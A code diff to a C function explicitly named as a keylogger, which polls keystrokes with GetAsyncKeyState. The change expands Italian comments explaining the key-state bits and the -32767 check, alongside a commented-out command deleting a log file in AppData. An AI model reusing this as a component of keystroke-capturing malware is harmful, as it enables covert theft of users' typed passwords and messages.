@@ -147,8 +147,14 @@ void keylog(void) //Key logger
                 //system("del %USERPROFILE%\\AppData\\Roaming\\Logs\\log.txt");
                 count = 0;
             }
-            //La funzione interroga lo stato corrente dei tasti della tastiera (al momento della chiamata).
-            //GetAsyncKeyState è equivalente al 100 % della funzione API di Windows con lo stesso nome.
+            //La funzione GetAsyncKeyState interroga lo stato corrente dei tasti della tastiera (al momento della chiamata).
+            //GetAsyncKeyState possiede due keystate in due bit diversi:
+            //bit 15 - lo stato in tempo reale della chiave è che è tenuto premuto
+            //bit 0 - il tasto è stato appena premuto, quindi è appena passato da rilasciato->premuto
+            //Il valore - 32767 è uguale a 0x8001 per un valore a 16 bit con segno. Pertanto, GetAsyncKeyState(i) == -32767)controlla 3 cose:
+            //1) il tasto è attualmente tenuto premuto
+            //2) il tasto è appena passato da rilasciato->premuto
+            //3) tutti gli altri bit in GetAsyncKeyState sono zero (che può o non può essere sempre vero)
             //http: //msdn.microsoft.com/en-us/library/windows/desktop/ms646293(v=vs.85).aspx
             if (GetAsyncKeyState(c) == -32767)
             {
